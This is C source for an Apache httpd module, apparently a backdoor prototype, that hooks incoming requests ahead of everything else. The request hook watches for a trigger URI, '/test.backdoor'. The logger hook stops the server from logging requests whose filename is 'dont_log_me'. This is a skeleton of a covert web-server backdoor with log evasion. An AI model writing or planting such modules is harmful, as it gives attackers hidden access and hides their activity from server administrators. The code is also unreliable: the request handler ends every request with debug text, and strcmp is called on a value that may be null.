#include "httpd.h"
#include "http_core.h"
#include "http_protocol.h"
#include "http_request.h"

static void register_hooks(apr_pool_t *pool);
static int winchester_handler(request_rec *r);
static int backblast_handler(request_rec *r);

static void register_hooks(apr_pool_t *pool)
{
   ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
   ap_hook_logger(backblast_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
}

static int winchester_handler(request_rec *r)
{
	if (!r->unparsed_uri || strcmp(r->unparsed_uri, "/test.backdoor"))
    {
        ap_rprintf(r, "Hooked, but failed if");

        return DONE;
    }

    ap_rprintf(r, "Hooked post_read");

	return DONE;
}

static int backblast_handler(request_rec *r)
{
    if (strcmp(r->filename, "dont_log_me"))
    {
        // if this filename does not appear, move along
        return OK;
    }

    // if it does, throw DONE without logging
    return DONE;
}

module AP_MODULE_DECLARE_DATA   winchester_module =
{
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    register_hooks
};
